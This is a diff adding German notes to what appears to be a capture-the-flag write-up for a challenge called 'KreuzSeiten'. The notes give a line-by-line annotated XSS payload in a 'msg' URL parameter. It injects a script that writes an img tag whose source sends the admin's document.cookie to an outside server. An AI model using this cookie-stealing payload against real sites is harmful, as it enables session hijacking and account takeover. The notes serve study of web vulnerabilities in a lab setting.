@@ -11,6 +11,36 @@ url: http://vuln3.redrocket.club:8111/
 
 ich muss den apache server wieder stoppen: https://www.tecmint.com/install-apache-web-server-in-a-docker-container/
 
+# KreuzSeiten
+
+1. Der Admin scheint nur Links aufzurufen, die von der Inspirational Quote Seite kommen
+2. Die Eingabe in das Formular wird auf der Folgeseite ohne vorheriges Sanatizing dargestellt
+3. Als XSS Angriff kann ein img tag eingeschleust werden, dessen source tag auf einen eigenen Webserver verweist:
+
+Diese URL wird als buggy reportet:
+
+```javascript
+http://vuln3.redrocket.club:8111/
+//parameter is msg (it does not work on the actual bug page) 
+// in parameter wird script eingebaut 
+?msg=<script>
+
+// document.write erzeugt einen String 
+document.write(
+// den string beginnen wir mit "hi und dann einen Link zu einem image 
+"hi
+// link zu image 
+<img src=https://server.de/",
+// aus dem link machen wir einen get-parameter, der den aktuell in der webanwendung bekannten cookie (vom admin) enthält 
+"?cookie=",
+// hier wird auf den aktuellen cookie zugegriffen 
+document.cookie,
+// wir schließen den link mit dem > tag und schließen den string der mit "hi begann mit einem " Zeichen 
+">")
+// wir beenden das dyn. java script 
+</script>
+```
+
 
 
 
